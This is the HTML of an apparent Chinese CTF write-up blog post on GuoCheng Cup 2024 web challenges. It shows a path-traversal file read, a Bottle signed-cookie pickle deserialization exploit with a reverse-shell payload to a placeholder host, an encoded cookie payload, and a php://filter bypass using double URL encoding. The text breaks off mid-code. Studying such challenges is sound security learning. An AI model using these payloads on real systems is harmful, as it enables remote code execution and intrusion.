<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=5"
    />
    <meta name="description" content="å­¦ä¹ ä¸€ä¸‹æ€è·¯ğŸ˜‹  Mountain æ— ç¯å¢ƒï¼Œçœ‹æ€è·¯   æ‰«ç›®å½•ï¼Œä¸‰ä¸ªç›®å½•ï¼Œè¯»æ³¨é‡Šä¸æºç   .&#x2F;displayæœ‰æç¤ºæœ‰.pngå›¾ç‰‡ï¼Œè¯»å–æœ‰æ–‡ä»¶è¯»å–ï¼Œç›®å½•ç©¿è¶Š&#x2F;etc&#x2F;passwdå¯ä»¥ï¼Œè¯»å·¥ä½œç›®å½•&#x2F;proc&#x2F;self&#x2F;cmdlineï¼Œbanäº†ï¼Œ&#x2F;proc&#x2F;1&#x2F;cmdlineï¼Œæœ‰pythoné¡¹ç›®(å¯ä»¥çœ‹ç›¸åº”åŒ…W">
<meta property="og:type" content="article">
<meta property="og:title" content="å›½åŸæ¯24">
<meta property="og:url" content="https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/index.html">
<meta property="og:site_name" content="KC1zs4&#39;s Blog">
<meta property="og:description" content="å­¦ä¹ ä¸€ä¸‹æ€è·¯ğŸ˜‹  Mountain æ— ç¯å¢ƒï¼Œçœ‹æ€è·¯   æ‰«ç›®å½•ï¼Œä¸‰ä¸ªç›®å½•ï¼Œè¯»æ³¨é‡Šä¸æºç   .&#x2F;displayæœ‰æç¤ºæœ‰.pngå›¾ç‰‡ï¼Œè¯»å–æœ‰æ–‡ä»¶è¯»å–ï¼Œç›®å½•ç©¿è¶Š&#x2F;etc&#x2F;passwdå¯ä»¥ï¼Œè¯»å·¥ä½œç›®å½•&#x2F;proc&#x2F;self&#x2F;cmdlineï¼Œbanäº†ï¼Œ&#x2F;proc&#x2F;1&#x2F;cmdlineï¼Œæœ‰pythoné¡¹ç›®(å¯ä»¥çœ‹ç›¸åº”åŒ…W">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://kc1zs4.github.io/pic/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/n0ob_un4er_sess.png">
<meta property="article:published_time" content="2025-01-24T08:10:41.848Z">
<meta property="article:modified_time" content="2025-01-31T03:34:53.932Z">
<meta property="article:tag" content="recurrence">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kc1zs4.github.io/pic/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/n0ob_un4er_sess.png">    
    <link
        rel="shortcut icon"
        href="/images/favicon.ico"
    />
       
    <link
        rel="icon"
        type="image/png"
        href="/images/favicon-192x192.png"
        sizes="192x192"
    />
       
    <link
        rel="apple-touch-icon"
        sizes="180x180"
        href="/images/apple-touch-icon.png"
    />
      
    <!-- title -->
    <title>å›½åŸæ¯24</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-Z6JGRC9FT2');
  </script>

 <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
     
    <!-- mathjax -->
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/01/27/x3ctf_2024/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/21/SUCTF2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&text=å›½åŸæ¯24"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&is_video=false&description=å›½åŸæ¯24"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=å›½åŸæ¯24&body=Check out this article: https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&name=å›½åŸæ¯24&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&t=å›½åŸæ¯24"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mountain"><span class="toc-number">1.</span> <span class="toc-text">Mountain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signal"><span class="toc-number">2.</span> <span class="toc-text">signal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signal-env"><span class="toc-number">2.1.</span> <span class="toc-text">signal env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signal-%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">signal åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8-env"><span class="toc-number">3.1.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨ env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#n0ob-un4er"><span class="toc-number">4.</span> <span class="toc-text">n0ob_un4er</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-env"><span class="toc-number">4.1.</span> <span class="toc-text">n0ob_un4er env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">n0ob_un4er åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text">n0ob_un4er å¤ç°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-galllery"><span class="toc-number">5.</span> <span class="toc-text">ez_galllery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-galllery-env"><span class="toc-number">5.1.</span> <span class="toc-text">ez_galllery env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-galllery-%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">ez_galllery åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">6.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">7.</span> <span class="toc-text">Ref</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        å›½åŸæ¯24
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name"></span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-24T08:10:41.848Z" class="dt-published" itemprop="datePublished">2025-01-24</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p>å­¦ä¹ ä¸€ä¸‹æ€è·¯ğŸ˜‹</p>
</blockquote>
<h2 id="Mountain"><a href="#Mountain" class="headerlink" title="Mountain"></a>Mountain</h2><blockquote>
<p>æ— ç¯å¢ƒï¼Œçœ‹æ€è·¯</p>
</blockquote>
<ol>
<li><p>æ‰«ç›®å½•ï¼Œä¸‰ä¸ªç›®å½•ï¼Œè¯»æ³¨é‡Šä¸æºç </p>
</li>
<li><p>.&#x2F;displayæœ‰æç¤ºæœ‰.pngå›¾ç‰‡ï¼Œè¯»å–æœ‰æ–‡ä»¶è¯»å–ï¼Œç›®å½•ç©¿è¶Š&#x2F;etc&#x2F;passwdå¯ä»¥ï¼Œè¯»å·¥ä½œç›®å½•&#x2F;proc&#x2F;self&#x2F;cmdlineï¼Œbanäº†ï¼Œ&#x2F;proc&#x2F;1&#x2F;cmdlineï¼Œæœ‰pythoné¡¹ç›®(å¯ä»¥çœ‹ç›¸åº”åŒ…WSGIServer CPython)ï¼špython&#x2F;appppp&#x2F;app.py</p>
</li>
<li><p>æºç å®¡è®¡</p>
<ol>
<li>å¯†é’¥åº”è¯¥å¯è¯»config.pyï¼Œsessionä¼ªé€ ï¼Ÿ</li>
<li>æ²¡æœ‰ä»€ä¹ˆæ‰§è¡Œç‚¹å•Šï¼Œ&#x2F;adminä¹Ÿæ²¡æœ‰</li>
<li>çŒœæµ‹å‡ºé¢˜äººæ„æ€ï¼Œè€ƒç‚¹åº”è¯¥æœ‰sessionï¼Œéš¾é“æœ‰sessionååºåˆ—åŒ–ï¼Ÿ(è¿™é‡Œçœ‹.&#x2F;helloè¿”å›åŒ…ä¼šæœ‰pickleçš„base64æ•°æ®æ ¼å¼)<ol>
<li><p><strong>å®¡è®¡ä¸€ä¸‹flaskæºç </strong>: pycharmèµ·ä¸€ä¸ªæˆ–è€…vscodeèµ·ä¸€ä¸ªï¼Œä¸æ˜¯æºç ï¼Œè¯»bottleé‡Œçš„requestçœ‹çœ‹(å¯ä»¥è¯»è¯»ä»–çš„ï¼Œé¿å…ç‰ˆæœ¬)ï¼Œä¸å¯¹bottleä¹Ÿæ˜¯æ¡†æ¶å˜»å˜»</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">    `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">    :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">    cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line"><span class="keyword">if</span> secret:</span><br><span class="line">    <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">    <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">        sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">        <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">            dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">            <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> default</span><br><span class="line"><span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, route, run, template, request, response</span><br><span class="line"><span class="keyword">from</span> config.D0g3_GC <span class="keyword">import</span> Mountain</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">messages = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/hello&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=Mountain)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=Mountain)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>]) <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker!!! I&#x27;ve caught you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å•çº¯è¿”å›æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/display&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_image</span>():</span><br><span class="line">    photo = request.query.get(<span class="string">&#x27;photo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> photo <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&#x27;display&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../|environ|self&quot;</span>, photo):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker!!! I&#x27;ll catch you no matter what you do!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    requested_path = os.path.join(os.getcwd(), <span class="string">&quot;picture&quot;</span>, photo)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> photo.endswith(<span class="string">&#x27;.png&#x27;</span>):</span><br><span class="line">            default_png_path = <span class="string">&quot;/appppp/picture/&quot;</span></span><br><span class="line">            pngrequested_path = default_png_path + photo</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(pngrequested_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line"></span><br><span class="line">            response.content_type = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;you have some errors, continue to try again&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=Mountain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&quot;administator&quot;</span>, messages=messages)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No permission!!!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8089</span>)   </span><br></pre></td></tr></table></figure>
</li>
<li><p>è§£é¢˜</p>
<ol>
<li>æ‹¿secretkeyï¼Œè¯»&#x2F;appppp&#x2F;config&#x2F;D0g3_GC.py</li>
<li>pycharmä¸€ä¸ªæœåŠ¡æ‹¿è€Œå·²flaskçš„cookieï¼Œæ¨¡ä»¿ç”Ÿæˆ<ol>
<li>æ”¾å…¥nameï¼Œå‘é€å³å¯<code>&quot;!yy/92kdpkjv1hVsC1Ja/yEUD6qowd3HNgdFsEIPhV8M=?gAWVbwAAAAAAAABdlCiMBG5hbWWUfZRoAYwIYnVpbHRpbnOUjARldmFslJOUjENfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveCAwPiYxIicplIWUUpRzZS4=&quot;</code></li>
</ol>
</li>
</ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, route, run, template, request, response</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">Mountain=<span class="string">&quot;M0UNTA1ND0G3GCYYDSP0EM5S20I314Y0UARE50SMAR7&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/x 0&gt;&amp;1&quot;&#x27;)&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/hello&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = &#123;<span class="string">&quot;name&quot;</span>: Evil()&#125;</span><br><span class="line">        response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=Mountain)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker!!! I&#x27;ve caught you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><h3 id="signal-env"><a href="#signal-env" class="headerlink" title="signal env"></a>signal env</h3><ol>
<li><code>docker build -t signal .</code></li>
<li><code>docker run -d -p 5000:80 --name signal-app signal</code></li>
</ol>
<h3 id="signal-åˆ†æ"><a href="#signal-åˆ†æ" class="headerlink" title="signal åˆ†æ"></a>signal åˆ†æ</h3><ol>
<li><p>æ‰«ç›®å½•ï¼Œadmin.php StoredAccounts.phpï¼Œ.index.php.swp(è¿™é‡Œæ²¡æœ‰æ‰«å‡ºæ¥wc) â€“ bsgm?ç»™çš„æºç é‡Œæ ¹æœ¬æ²¡æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œä¸ç®¡äº†</p>
<ol>
<li>æœ‰ç”¨æˆ·guest:MyF3iend</li>
</ol>
</li>
<li><p>è¯»æ–‡ä»¶</p>
<ol>
<li><p>&#x2F;guest.php?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php è¢«è¿‡æ»¤äº†ï¼Œemmï¼Œæ¨æµ‹ä¸€ä¸‹åé¢ä½¿ç”¨çš„æ˜¯include</p>
</li>
<li><p>&#x2F;guest.php?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php okï¼Œå› è¯¥æ˜¯base64è¢«è¿‡æ»¤äº†</p>
<ol>
<li>idea1: å‡†ç¡®æ˜¯base, convert, rotè¢«è¿‡æ»¤äº†ï¼Œä¼¼ä¹ä¸è¡Œï¼Œwpç”¨åˆ°äºŒæ¬¡urlç¼–ç ï¼Œemmï¼Œä¸æ‡‚ï¼Œè¹²ä¸€ä¸‹<code>/guest.php?path=php://filter/read=%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=/var/www/html/index.php</code>ï¼Œè¿™é‡Œçš„&#x2F;var&#x2F;www&#x2F;htmlå¯ä»¥è¯»å‡ºæ¥</li>
<li>idea2: filter-chainè¯»æ–‡ä»¶ï¼Ÿè¿™é‡Œä¼¼ä¹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œç­‰ä¸‹è¯»ä¸€ä¸‹</li>
<li>idea3: filter-chainç›´æ¥rceï¼Ÿä¼¼ä¹ä¹Ÿæ˜¯å¯ä»¥çš„</li>
<li>è¯»æ–‡ä»¶<ol>
<li>&#x2F;tmp&#x2F;hello.php</li>
<li>index.php</li>
<li>StoredAccounts.php</li>
<li>admin.php</li>
</ol>
</li>
<li>è´´ä¸€ä¸‹å…³é”®çš„ä»£ç </li>
</ol>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 